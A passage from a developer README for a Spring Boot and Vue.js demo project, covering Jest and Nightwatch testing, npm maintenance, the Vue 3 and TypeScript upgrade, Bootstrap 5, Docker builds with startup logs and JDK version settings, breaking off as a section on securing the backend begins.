How to test components with `router-view` or `router-link` https://vue-test-utils.vuejs.org/guides/using-with-vue-router.html#testing-components-that-use-router-link-or-router-view.

The test files itself could be named `xyz.spec.js` or `xyz.test.js` - and could reside nearly everywhere in the project.

##### Jest Configuration  

The Jest run-configuration is done inside the [package.json](frontend/package.json):

```js
""scripts"";: {
    ...
    ""test:unit"";: ""vue-cli-service test:unit --coverage"",;
    ....
  },
```

Jest can be configured via `jest.config.js` in your project root, or the `jest` field in [package.json](frontend/package.json). In our case we especially need to configure `coverageDirectory`:

```json
  ],
  ""jest"": {
    ...
    ""coverageDirectory"": ""<rootDir>/tests/unit/coverage"",
    ""collectCoverageFrom"": [
      ""src/**/*.{js,vue}"",
      ""!src/main.js"",
      ""!src/router/index.js"",
      ""!**/node_modules/**""
    ]
  }
}
```

Jest needs to know the right output directory `/tests/unit/coverage` to show a correct output when `npm run test:unit` is run (or the corresponding Maven build). If you run the Jest Unit tests now with:

`npm run test:unit`

- you´ll recognize the table of test covered files:

![unittestrun-jest](screenshots/unittestrun-jest.png)


##### Integration in Maven build (via frontend-maven-plugin)

Inside the [pom.xml](pom.xml) we always automatically run the Jest Unittests with the following configuration:

```xml
<!-- Run Unit tests -->
  <execution>
    <id>npm run test:unit</id>
    <goals>
      <goal>npm</goal>
    </goals>
    <!-- optional: default phase is ""generate-resources"" -->
    <phase>test</phase>
    <!-- Optional configuration which provides for running any npm command -->
    <configuration>
      <arguments>run test:unit</arguments>
    </configuration>
  </execution>
```

This will integrate the Jest Unittests right after the npm run build command, just you are used to in Java-style projects:

![maven-integration-jest-unittests](screenshots/maven-integration-jest-unittests.png)

And don't mind the depiction with `ERROR` - this is just a known bug: https://github.com/eirslett/frontend-maven-plugin/issues/584


##### Run Jest tests inside IntelliJ

First, we need to install the NodeJS IntelliJ plugin (https://www.jetbrains.com/help/idea/developing-node-js-applications.html), which isn't bundled with IntelliJ by default:

![nodejs-intellij-plugin](screenshots/nodejs-intellij-plugin.png)

IntelliJ Jest integration docs: https://www.jetbrains.com/help/idea/running-unit-tests-on-jest.html

The automatic search inside the [package.json](frontend/package.json) for the Jest configuration file [jest.conf.js](frontend/test/unit/jest.conf.js) doesn't seem to work right now, so we have to manually configure the `scripts` part of:

```
""unit"": ""jest --config test/unit/jest.conf.js --coverage"",
```

inside the Run Configuration under `Jest` and `All Tests`:

![configure-jest-inside-intellij](screenshots/configure-jest-inside-intellij.png)

Now, when running `All Tests`, this should look like you're already used to Unittest IntelliJ-Integration:

![run-jest-inside-intellij](screenshots/run-jest-inside-intellij.png)

 

## End-2-End (E2E) tests with Nightwatch

Great tooling: http://nightwatchjs.org/ - Nightwatch controls WebDriver / Selenium standalone Server in own child process and abstracts from those, providing a handy DSL for Acceptance tests:

Docs: http://nightwatchjs.org/gettingstarted/#browser-drivers-setup

![http://nightwatchjs.org/img/operation.png](http://nightwatchjs.org/img/operation.png)

Nightwatch is configured through the [nightwatch.conf.js](/frontend/test/e2e/nightwatch.conf.js). Watch out for breaking changes in 1.x: https://github.com/nightwatchjs/nightwatch/wiki/Migrating-to-Nightwatch-1.0

More options could be found in the docs: http://nightwatchjs.org/gettingstarted/#settings-file


#### Write Nightwatch tests

An example Nightwatch test is provided in [HelloAcceptance.test.js](/frontend/test/e2e/specs/HelloAcceptance.test.js):

```js
module.exports = {
    'default e2e tests': browser => {
        browser
            .url(process.env.VUE_DEV_SERVER_URL)
            .waitForElementVisible('#app', 5000)
            .assert.elementPresent('.hello')
            .assert.containsText('h1', 'Welcome to your Vue.js powered Spring Boot App')
            .assert.elementCount('img', 1)
            .end()
    }
}
```

##### Run E2E Tests

`npm run test:e2e`


## Run all tests

 `npm test`



## NPM Security

npm Security - npm@6

https://medium.com/npm-inc/announcing-npm-6-5d0b1799a905

`npm audit`

https://blog.npmjs.org/post/173719309445/npm-audit-identify-and-fix-insecure

Run `npm audit fix` to update the vulnerable packages. Only in situations, where nothing else helps, try `npm audit fix --force` (this will also install braking changes)

https://nodejs.org/en/blog/vulnerability/june-2018-security-releases/

---> __Update NPM regularly__

https://docs.npmjs.com/troubleshooting/try-the-latest-stable-version-of-npm

`npm install -g npm@latest`

---> __Update Packages regularly__

https://docs.npmjs.com/getting-started/updating-local-packages

`npm outdated`

`npm update`




## Shift from templates to plugin-based architecture in Vue Cli 3

In the long run, templates like the main [webpack](https://github.com/vuejs-templates/webpack) are deprecated in the Vue.js universe:

https://vuejsdevelopers.com/2018/03/26/vue-cli-3/

Plugins bring the following benefits compared to templates:

* No lock in, as plugins can be added at any point in the development lifecycle
* Zero config plugins allow you to spend time developing rather than configuring
* Easy to upgrade, as configuration can be customized without “ejecting”
* Allows developers to make their own plugins and presets

Starting point: https://cli.vuejs.org/


#### OMG! My package.json is so small - Vue CLI 3 Plugins

From https://cli.vuejs.org/guide/plugins-and-presets.html:

> Vue CLI uses a plugin-based architecture. If you inspect a newly created project's package.json, you will find dependencies that start with `@vue/cli-plugin-`. Plugins can modify the internal webpack configuration and inject commands to `vue-cli-service`. Most of the features listed during the project creation process are implemented as plugins.

With plugings, extensions to an existing project could also be made via: `vue add pluginName`. E.g. if you want to add Nightwatch E2E tests to your project, just run `vue add @vue/e2e-nightwatch`. All scoped packages are available here: https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue

These new Vue CLI 3 plugin architecture cleans our big `package.json` to a really neat compact thing. This was the old big dependency block:

````json
  ""devDependencies"": {
    ""@vue/test-utils"": ""^1.0.0-beta.25"",
    ""autoprefixer"": ""^7.1.2"",
    ""babel-core"": ""^6.26.3"",
    ""babel-helper-vue-jsx-merge-props"": ""^2.0.3"",
    ""babel-jest"": ""^21.0.2"",
    ""babel-loader"": ""^7.1.5"",
    ""babel-plugin-dynamic-import-node"": ""^1.2.0"",
    ""babel-plugin-syntax-jsx"": ""^6.18.0"",
    ""babel-plugin-transform-es2015-modules-commonjs"": ""^6.26.0"",
    ""babel-plugin-transform-runtime"": ""^6.22.0"",
    ""babel-plugin-transform-vue-jsx"": ""^3.5.0"",
    ""babel-preset-env"": ""^1.7.0"",
    ""babel-preset-stage-2"": ""^6.22.0"",
    ""babel-register"": ""^6.22.0"",
    ""chalk"": ""^2.4.1"",
    ""chromedriver"": ""^2.41.0"",
    ""copy-webpack-plugin"": ""^4.5.2"",
    ""cross-spawn"": ""^5.0.1"",
    ""css-loader"": ""^0.28.0"",
    ""extract-text-webpack-plugin"": ""^3.0.0"",
    ""file-loader"": ""^1.1.4"",
    ""friendly-errors-webpack-plugin"": ""^1.6.1"",
    ""html-webpack-plugin"": ""^2.30.1"",
    ""jest"": ""^22.0.4"",
    ""jest-serializer-vue"": ""^0.3.0"",
    ""nightwatch"": ""^1.0.11"",
    ""node-notifier"": ""^5.1.2"",
    ""optimize-css-assets-webpack-plugin"": ""^3.2.0"",
    ""ora"": ""^1.2.0"",
    ""portfinder"": ""^1.0.17"",
    ""postcss-import"": ""^11.0.0"",
    ""postcss-loader"": ""^2.1.6"",
    ""postcss-url"": ""^7.2.1"",
    ""rimraf"": ""^2.6.0"",
    ""selenium-server"": ""^3.14.0"",
    ""semver"": ""^5.5.1"",
    ""shelljs"": ""^0.7.6"",
    ""uglifyjs-webpack-plugin"": ""^1.3.0"",
    ""url-loader"": ""^1.1.1"",
    ""vue-jest"": ""^1.0.2"",
    ""vue-loader"": ""^13.7.3"",
    ""vue-style-loader"": ""^3.0.1"",
    ""vue-template-compiler"": ""^2.5.17"",
    ""webpack"": ""^3.6.0"",
    ""webpack-bundle-analyzer"": ""^2.13.1"",
    ""webpack-dev-server"": ""^2.11.3"",
    ""webpack-merge"": ""^4.1.4""
  },
````

As you can see, we´re not only maintaining our high-level libraries of choice like nightwatch, jest and so on. We´re also maintaining libraries that they use itself. Now this is over with Vue CLI 3. Let´s have a look at the super clean dependency block now:

```json
""devDependencies"": {
    ""@vue/cli-plugin-babel"": ""^3.0.3"",
    ""@vue/cli-plugin-e2e-nightwatch"": ""^3.0.3"",
    ""@vue/cli-plugin-unit-jest"": ""^3.0.3"",
    ""@vue/cli-service"": ""^3.0.3"",
    ""@vue/test-utils"": ""^1.0.0-beta.20"",
    ""babel-core"": ""7.0.0-bridge.0"",
    ""babel-jest"": ""^23.0.1"",
    ""node-sass"": ""^4.9.0"",
    ""sass-loader"": ""^7.0.1"",
    ""vue-template-compiler"": ""^2.5.17""
  },
``` 

As you dig into the directories like `node_modules/@vue/cli-plugin-e2e-nightwatch`, you´ll find where the used libraries of nightwatch are configured - in the respective `package.json` there:

```json
  ""dependencies"": {
    ""@vue/cli-shared-utils"": ""^3.0.2"",
    ""chromedriver"": ""^2.40.0"",
    ""deepmerge"": ""^2.1.1"",
    ""execa"": ""^0.10.0"",
    ""nightwatch"": ""^0.9.21"",
    ""selenium-server"": ""^3.13.0""
  },
```

This is really cool, I have to admit!


#### The vue.config.js file

Vue CLI 3 removes the need for explicit configuration files - and thus you wont find any `build` or `config` directories in your projects root any more. This now implements a ""convention over configuration"" approach, which makes it much easier to kick-start a Vue.js project, as it provides widly used defaults to webpack etc. It also eases the upgradeability of Vue.js projects - or even makes it possible. 

__But__: How do we configure webpack etc. for CORS handling, the build directories and so on? This could be done with the optional [vue.config.js](https://cli.vuejs.org/config/#vue-config-js):

```javascript
module.exports = {
  // proxy all webpack dev-server requests starting with /api
  // to our Spring Boot backend (localhost:8098) using http-proxy-middleware
  // see https://cli.vuejs.org/config/#devserver-proxy
  devServer: {
    proxy: {
      '/api': {
        target: 'http://localhost:8098',
        ws: true,
        changeOrigin: true
      }
    }
  },
  // Change build paths to make them Maven compatible
  // see https://cli.vuejs.org/config/
  outputDir: 'target/dist'
}
```

#### Updating Vue in an existing project

Update your local `@vue/cli` to the latest version:

```
npm install -g @vue/cli
```

Then update Vue.js and all your other JS dependencies with:

```
cd frontend
npm update
```


## Upgrade to Vue.js 3.x/4.x next

Let's move from 2.6.x -> 3.x/4.x next here.

> Be aware that [the latest version of vue currently is `2.6.x` and `3.x` is considered `next`](https://www.npmjs.com/package/vue)!

There are some resources:

https://v3.vuejs.org/guide/migration/introduction.html#quickstart

https://johnpapa.net/vue2-to-vue3/

And if we are using 3.x, we can even migrate to 4.x: https://cli.vuejs.org/migrating-from-v3/


#### Upgrade from 2.x to 3.x

There's a migration tooling, simply use:

```shell
vue add vue-next
```

This took around 3 minutes or more on my MacBook and changed some files:

![vue-js-2.x-to-3.x-next-upgrade](screenshots/vue-js-2.x-to-3.x-next-upgrade.png)

The [package.json](frontend/package.json) got some new or upgraded deps:

![vue-js-2.x-to-3.x-next-upgrade-dependencies](screenshots/vue-js-2.x-to-3.x-next-upgrade-dependencies.png)

[As John stated in his post](https://johnpapa.net/vue2-to-vue3/) it's strange to find `beta` versions with `vue`, `vue-router` and `vuex`. 

So in order to see what a fresh skeleton would produce, let's also create one in another dir ([I assume you have `npm install -g @vue/cli` installed](https://v3.vuejs.org/guide/migration/introduction.html#quickstart):

```shell
mkdir vue3test && cd vue3test
vue create hello-vue3
```

I aligned my project to match the latest skeleton generation much better: So router, store and api got their own directories. The views are now in the correct folder `views` - and I extracted one component to use from the newly introduced `Home.vue` view: the `HelloSpringWorld.vue` component.

I also went over the [package.json](frontend/package.json) and upgraded to the latest release versions instead of alphas (except `@vue/test-utils` which only has a `rc` atm).

All imports were refactored too. Coming from this style:

```javascript
import Vue from 'vue'
import Router from 'vue-router'
```

everything now reads:

```javascript
import { createApp } from 'vue';
import { createRouter, createWebHistory } from 'vue-router'
```

Also check your `router.js` or [router/index.js](frontend/src/router/index.js)! Using a path redirect like this leads to a non working routing configuration:

```javascript
    // otherwise redirect to home
    { path: '*', redirect: '/' }
```

The error in the Browser console states:

```shell
Uncaught Error: Catch all routes (""*"") must now be defined using a param with a custom regexp.
See more at https://next.router.vuejs.org/guide/migration/#removed-star-or-catch-all-routes.
```

I changed it to the new param with regex syntax like this:

```javascript
    // otherwise redirect to home
    { path: '/:pathMatch(.*)*', redirect: '/' }
```

A crucial point to get jest to work again, was to add the following to the [jest.config.js](frontend/jest.config.js):

```javascript
  transform: {
    '^.+\\.vue$': 'vue-jest'
  }
```

Otherwise my tests ran into the following error:

```shell
npm run test:unit

> frontend@4.0.0 test:unit
> vue-cli-service test:unit --coverage

 FAIL  tests/unit/views/User.spec.js
  ● Test suite failed to run

    Vue packages version mismatch:

    - vue@3.0.11 (/Users/jonashecht/dev/spring-boot/spring-boot-vuejs/frontend/node_modules/vue/index.js)
    - vue-template-compiler@2.6.12 (/Users/jonashecht/dev/spring-boot/spring-boot-vuejs/frontend/node_modules/vue-template-compiler/package.json)

    This may cause things to work incorrectly. Make sure to use the same version for both.
    If you are using vue-loader@>=10.0, simply update vue-template-compiler.
    If you are using vue-loader@<10.0 or vueify, re-installing vue-loader/vueify should bump vue-template-compiler to the latest.

      at Object.<anonymous> (node_modules/vue-template-compiler/index.js:10:9)
```

Luckily this so answer helped me out: https://stackoverflow.com/a/65111966/4964553

And finally Bootstrap Vue doesn't support Vue 3.x right now: https://github.com/bootstrap-vue/bootstrap-vue/issues/5196 - So I temporarily commented out the imports.


#### Add TypeScript

Vue 3.x is now build with TypeScript: https://v3.vuejs.org/guide/typescript-support.html

> A static type system can help prevent many potential runtime errors as applications grow, which is why Vue 3 is written in TypeScript. This means you don't need any additional tooling to use TypeScript with Vue - it has first-class citizen support.

There's also a huge documentation of TypeScript itself at https://www.typescriptlang.org/docs/ I can also recommend https://medium.com/js-dojo/adding-typescript-to-your-existing-vuejs-2-6-app-aaa896c2d40a

To migrate your project there's the command:

```shell
vue add typescript
```

The first question arises: `Use class-style component syntax? (Y/n)` whether to use class-style component syntax or not. I didn't use it. I think the interface definitions of components are concise enough without the class-style. But let's see how this will work out.

So this was the output:

```shell
vue add typescript
 WARN  There are uncommitted changes in the current repository, it's recommended to commit or stash them first.
? Still proceed? Yes

📦  Installing @vue/cli-plugin-typescript...


added 59 packages, removed 58 packages, and audited 2219 packages in 6s

85 packages are looking for funding
  run `npm fund` for details

3 low severity vulnerabilities

To address all issues (including breaking changes), run:
  npm audit fix --force

Run `npm audit` for details.
✔  Successfully installed plugin: @vue/cli-plugin-typescript

? Use class-style component syntax? No
? Use Babel alongside TypeScript (required for modern mode, auto-detected polyfills, transpiling JSX)? Yes
? Use TSLint? Yes
? Pick lint features: Lint on save
? Convert all .js files to .ts? Yes
? Allow .js files to be compiled? Yes
? Skip type checking of all declaration files (recommended for apps)? Yes

🚀  Invoking generator for @vue/cli-plugin-typescript...
📦  Installing additional dependencies...


added 2 packages, and audited 2221 packages in 3s
...
✔  Successfully invoked generator for plugin: @vue/cli-plugin-typescript
```

Now I went through all the componentes and views and extended `<script>` to `<script lang=""ts"">`.

Also I changed

```javascript
  export default {
```

to

```javascript
import { defineComponent } from 'vue';

export default defineComponent({
```

Now we need to transform our JavaScript code into TypeScript.

A really good introduction could be found here: https://www.vuemastery.com/blog/getting-started-with-typescript-and-vuejs/

> This process will take a while, depending on your code - and mainly on your knowledge about TypeScript. But I think it's a great path to go!

Don't forget to deactivate source control for `.js` and `.map` files in `src`, because these will now be generated (aka transpiled) from TypeScript and [shouldn't be checked in (anymore)](https://stackoverflow.com/a/26464907/4964553).

I enhanced my [frontend/.gitignore](frontend/.gitignore) like this:

```shell
# TypeScript
*.map
src/*.js
test/*.js
```

##### Vuex Store with TypeScript

According to https://next.vuex.vuejs.org/guide/typescript-support.html#typing-store-property-in-vue-component in order to use vuex store with TypeScript, we:

> must declare your own module augmentation.

TLDR; we need to create a file [src/vuex.d.ts](frontend/src/vuex.d.ts):

```javascript
import { ComponentCustomProperties } from 'vue'
import { Store } from 'vuex'

declare module '@vue/runtime-core' {
  // declare your own store states
  interface State {
    count: number
  }

  // provide typings for `this.$store`
  interface ComponentCustomProperties {
    $store: Store<State>
  }
}
```


#### Bootstrap support for Vue.js 3/Next

Our View [Bootstrap.vue](frontend/src/views/Bootstrap.vue) is based on the library `bootstrap-vue`, which brings in some nice Bootstrap CSS stylings & components.

But bootstrap-vue isn't compatible with Vue.js 3/Next: https://github.com/bootstrap-vue/bootstrap-vue/issues/5196 and it's unclear, when it's going to support it - or even if at all.

With the upgrade to Vue.js 3.x our `bootstrap-vue` based component view stopped working.

There's also another change: [Bootstrap 5.x is here to be the next evolutionary step - and it even dropped the need for JQuery](https://blog.getbootstrap.com/2020/06/16/bootstrap-5-alpha/).

But also Bootstrap 5.x isn't supported by `bootstrap-vue` right now. So let's try to use Bootstrap without it?!

Therefore install bootstrap next (which - as like Vue.js - stands for the new version 5):

```shell
npm i bootstrap@next
npm i @popperjs/core
```

Since Bootstrap 5 depends on `popperjs` for tooltips (see https://getbootstrap.com/docs/5.0/getting-started/introduction/#js), we also need to include it.

We can remove `""bootstrap-vue"": ""2.21.2""` and `""jquery"": ""3.6.0"",` from our `package.json`.

We also need to import Bootstrap inside our [main.ts](frontend/src/main.ts):

```javascript
import ""bootstrap/dist/css/bootstrap.min.css"";
import ""bootstrap"";
```

Let's try to use Bootstrap 5 inside our [Bootstrap.vue](frontend/src/views/Bootstrap.vue).

And also inside the `Login.vue` and the `Protected.vue`. Using Bootstrap 5.x components without `bootstrap-vue` seems to be no problem (see docs how to use here: https://getbootstrap.com/docs/5.0/components/badge/).


## Build and run with Docker

In the issue [jonashackt/spring-boot-vuejs/issues/25](https://github.com/jonashackt/spring-boot-vuejs/issues/25) the question on how to build and run our spring-boot-vuejs app with Docker. 

As already stated in the issue there are multiple ways of doing this. One I want to outline here is a more in-depth variant, where you'll know exacltly what's going on behind the scenes.

First we'll make use of [Docker's multi-stage build feature](https://docs.docker.com/develop/develop-images/multistage-build/) - in __the first stage__ we'll build our Spring Boot Vue.js app using our established Maven build process. Let's have a look into our [Dockerfile](Dockerfile):

```dockerfile
# Docker multi-stage build

# 1. Building the App with Maven
FROM maven:3-jdk-11

ADD . /springbootvuejs
WORKDIR /springbootvuejs

# Just echo so we can see, if everything is there :)
RUN ls -l

# Run Maven build
RUN mvn clean install
```

A crucial part here is to add all necessary files into our Docker build context - but leaving out the underlying OS specific node libraries! As not leaving them out would lead [to errors like](https://stackoverflow.com/questions/37986800/node-sass-could-not-find-a-binding-for-your-current-environment?page=1&tab=active#tab-top):

```
Node Sass could not find a binding for your current environment: Linux 64-bit with Node.js 11.x
```

Therefore we create a [.dockerignore](.dockerignore) file and leave out the directories `frontend/node_modules` & `frontend/node` completely using the `frontend/node*` configuration:

```
# exclude underlying OS specific node modules
frontend/node*

# also leave out pre-build output folders
frontend/target
backend/target
```

We also ignore the pre-build output directories.

In __the second stage__ of our [Dockerfile](Dockerfile) we use the build output of the first stage and prepare everything to run our Spring Boot powered Vue.js app later:

```dockerfile
# Just using the build artifact and then removing the build-container
FROM openjdk:11-jdk

MAINTAINER Jonas Hecht

VOLUME /tmp

# Add Spring Boot app.jar to Container
COPY --from=0 ""/springbootvuejs/backend/target/backend-0.0.1-SNAPSHOT.jar"" app.jar

ENV JAVA_OPTS=""""

# Fire up our Spring Boot app by default
ENTRYPOINT [ ""sh"", ""-c"", ""java $JAVA_OPTS -Djava.security.egd=file:/dev/./urandom -jar /app.jar"" ]
```

Now we should everything prepared to run our Docker build:

```
docker build . --tag spring-boot-vuejs:latest
```

This build can take a while, since all Maven and NPM dependencies need to be downloaded for the build.

When the build is finished, simply start a Docker container based on the newly build image and prepare the correct port to be bound to the Docker host for easier access later:

```
docker run -d -p 8098:8098 --name myspringvuejs spring-boot-vuejs
```

Have a look into your running Docker containers with `docker ps` and you should see the new container:

```
$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES
745e854d7781        spring-boot-vuejs   ""sh -c 'java $JAVA_O…""   12 seconds ago      Up 11 seconds       0.0.0.0:8098->8098/tcp   myspringvuejs
```

If you want to see the typical Spring Boot startup logs, just use `docker logs 745e854d7781 --follow`:

```
$ docker logs 745e854d7781 --follow

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.1.2.RELEASE)

2019-01-29 09:42:07.621  INFO 8 --- [           main] d.j.s.SpringBootVuejsApplication         : Starting SpringBootVuejsApplication v0.0.1-SNAPSHOT on 745e854d7781 with PID 8 (/app.jar started by root in /)
2019-01-29 09:42:07.627  INFO 8 --- [           main] d.j.s.SpringBootVuejsApplication         : No active profile set, falling back to default profiles: default
2019-01-29 09:42:09.001  INFO 8 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data repositories in DEFAULT mode.
2019-01-29 09:42:09.103  INFO 8 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 90ms. Found 1 repository interfaces.
2019-01-29 09:42:09.899  INFO 8 --- [           main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration' of type [org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration$$EnhancerBySpringCGLIB$$bb072d94] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)
2019-01-29 09:42:10.715  INFO 8 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8098 (http)
2019-01-29 09:42:10.765  INFO 8 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
2019-01-29 09:42:10.765  INFO 8 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.14]
2019-01-29 09:42:10.783  INFO 8 --- [           main] o.a.catalina.core.AprLifecycleListener   : The APR based Apache Tomcat Native library which allows optimal performance in production environments was not found on the java.library.path: [/usr/java/packages/lib:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib]
2019-01-29 09:42:10.920  INFO 8 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
2019-01-29 09:42:10.921  INFO 8 --- [           main] o.s.web.context.ContextLoader            : Root WebApplicationContext: initialization completed in 3209 ms
2019-01-29 09:42:11.822  INFO 8 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...
2019-01-29 09:42:12.177  INFO 8 --- [           main] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.
2019-01-29 09:42:12.350  INFO 8 --- [           main] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [
	name: default
	...]
2019-01-29 09:42:12.520  INFO 8 --- [           main] org.hibernate.Version                    : HHH000412: Hibernate Core {5.3.7.Final}
2019-01-29 09:42:12.522  INFO 8 --- [           main] org.hibernate.cfg.Environment            : HHH000206: hibernate.properties not found
2019-01-29 09:42:12.984  INFO 8 --- [           main] o.hibernate.annotations.common.Version   : HCANN000001: Hibernate Commons Annotations {5.0.4.Final}
2019-01-29 09:42:13.894  INFO 8 --- [           main] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.H2Dialect
2019-01-29 09:42:15.644  INFO 8 --- [           main] o.h.t.schema.internal.SchemaCreatorImpl  : HHH000476: Executing import script 'org.hibernate.tool.schema.internal.exec.ScriptSourceInputNonExistentImpl@64524dd'
2019-01-29 09:42:15.649  INFO 8 --- [           main] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
2019-01-29 09:42:16.810  INFO 8 --- [           main] o.s.s.concurrent.ThreadPoolTaskExecutor  : Initializing ExecutorService 'applicationTaskExecutor'
2019-01-29 09:42:16.903  WARN 8 --- [           main] aWebConfiguration$JpaWebMvcConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
2019-01-29 09:42:17.116  INFO 8 --- [           main] o.s.b.a.w.s.WelcomePageHandlerMapping    : Adding welcome page: class path resource [public/index.html]
2019-01-29 09:42:17.604  INFO 8 --- [           main] o.s.b.a.e.web.EndpointLinksResolver      : Exposing 2 endpoint(s) beneath base path '/actuator'
2019-01-29 09:42:17.740  INFO 8 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8098 (http) with context path ''
2019-01-29 09:42:17.745  INFO 8 --- [           main] d.j.s.SpringBootVuejsApplication         : Started SpringBootVuejsApplication in 10.823 seconds (JVM running for 11.485)
```

Now access your Dockerized Spring Boot powererd Vue.js app inside your Browser at [http://localhost:8098](http://localhost:8098). 

If you have played enough with your Dockerized app, don't forget to stop (`docker stop 745e854d7781`) and remove (`docker rm 745e854d7781`) it in the end.


#### Autorelease to Docker Hub on hub.docker.com

We also want to have the current version of our code build and released to https://hub.docker.com/. Therefore head to the repositories tab in Docker Hub and click `Create Repository`:

![docker-hub-create-repo](screenshots/docker-hub-create-repo.png)

As the docs state, there are some config options to [setup automated builds](https://docs.docker.com/docker-hub/builds/).

Finally, we should see our Docker images released on https://hub.docker.com/r/jonashackt/spring-boot-vuejs and could run this app simply by executing:

```
docker run -p 8098:8098 jonashackt/spring-boot-vuejs:latest
```

This pulls the latest `jonashackt/spring-boot-vuejs` image and runs our app locally:

```
docker run -p 8098:8098 jonashackt/spring-boot-vuejs:latest
Unable to find image 'jonashackt/spring-boot-vuejs:latest' locally
latest: Pulling from jonashackt/spring-boot-vuejs
9a0b0ce99936: Pull complete
db3b6004c61a: Pull complete
f8f075920295: Pull complete
6ef14aff1139: Pull complete
962785d3b7f9: Pull complete
e275e7110d81: Pull complete
0ce121b6a2ff: Pull complete
71607a6adeb3: Pull complete
Digest: sha256:4037576ba5f6c58ed067eeef3ab2870a9de8dd1966a5906cb3d36d0ad98fa541
Status: Downloaded newer image for jonashackt/spring-boot-vuejs:latest

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.2.0.RELEASE)

2019-11-02 16:15:37.967  INFO 7 --- [           main] d.j.s.SpringBootVuejsApplication         : Starting SpringBootVuejsApplication v0.0.1-SNAPSHOT on aa490bc6ddf4 with PID 7 (/app.jar started by root in /)
2019-11-02 16:15:37.973  INFO 7 --- [           main] d.j.s.SpringBootVuejsApplication         : No active profile set, falling back to default profiles: default
2019-11-02 16:15:39.166  INFO 7 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data repositories in DEFAULT mode.
2019-11-02 16:15:39.285  INFO 7 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 99ms. Found 1 repository interfaces.
2019-11-02 16:15:39.932  INFO 7 --- [           main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration' of type [org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)
2019-11-02 16:15:40.400  INFO 7 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8098 (http)
2019-11-02 16:15:40.418  INFO 7 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
...
2019-11-02 16:15:54.048  INFO 7 --- [nio-8098-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
2019-11-02 16:15:54.081  INFO 7 --- [nio-8098-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 32 ms
```


Now head over to [http://localhost:8098/](http://localhost:8098/) and see the app live :)


# Run with JDK 8, 9 or 11 ff

As with Spring Boot, we can define the desired Java version simply by editing our backend's [pom.xml](backend/pom.xml): 

```
	<properties>
		<java.version>1.8</java.version>
	</properties>
```

If you want to have `JDK9`, place a `<java.version>9</java.version>` or other versions just as you like to (see [this stackoverflow answer](https://stackoverflow.com/questions/54467287/how-to-specify-java-11-version-in-spring-spring-boot-pom-xml)).

Spring Boot handles the needed `maven.compiler.release`, which tell's Java from version 9 on to build for a specific target.

We just set `1.8` as the baseline here, since if we set a newer version as the standard, builds on older versions then 8 will fail (see [this build log for example](https://travis-ci.org/jonashackt/spring-boot-vuejs/builds/547227298).

Additionally, we use GitHub Actions to run the Maven build on some mayor Java versions - have a look into the [build.yml](.github/workflows/build.yml) workflow:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        java-version: [ 8, 11, 15 ]
```


# Secure Spring Boot backend and protect Vue.js frontend

Securing parts of our application must consist of two parts: securing the Spring Boot backend - and reacting on that secured backend in the Vue.js frontend.

https://spring.io/guides/tutorials/spring-security-and-angular-js/

https://developer.okta.com/blog/2018/11/20/build-crud-spring-and-vue

https://auth0.com/blog/vuejs2-authentication-tutorial/

https://medium.com/@zitko/structuring-a-vue-project-authentication-87032e5bfe16





## Secure the backend API with Spring Security

https://spring.io/guides/tutorials/spring-boot-oauth2

https://spring.io/guides/gs/securing-web/

https://www.baeldung.com/rest-assured-authentication

Now let's focus on securing our Spring Boot backend first! Therefore we introduce a new RESTful resource, that we want to secure specifically:


                   +---+                  +---+                  +---+
                   |   | /api/hello       |   | /api/user        |   | /api/secured
                   +---+                  +---+                  +---+
                     |                      |                      |
        +-----------------------------------------------------------------------+
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |  Spring Boot backend                                                  |
